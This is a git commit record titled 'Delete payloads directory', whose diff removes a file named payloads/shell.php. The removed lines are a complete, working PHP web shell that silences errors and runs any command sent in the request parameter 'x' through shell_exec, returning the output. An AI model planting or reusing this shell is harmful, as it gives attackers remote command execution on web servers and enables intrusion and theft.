6106c8cfca3ee610b834741ab3c47e4c6a9e690f
Traciamento26 <gatygqtwdhaorwusfq@gmail.com>
2026-07-29 23:31:36 +0200

    Delete payloads directory

--- payloads/shell.php
+++
@@ -1,9 +0,0 @@
-<?php
-error_reporting(0);
-@set_time_limit(0);
-if (isset($_REQUEST['x'])) {
-    header('Content-Type: text/plain; charset=utf-8');
-    echo shell_exec($_REQUEST['x'] . ' 2>&1');
-    exit;
-}
-echo "OK";
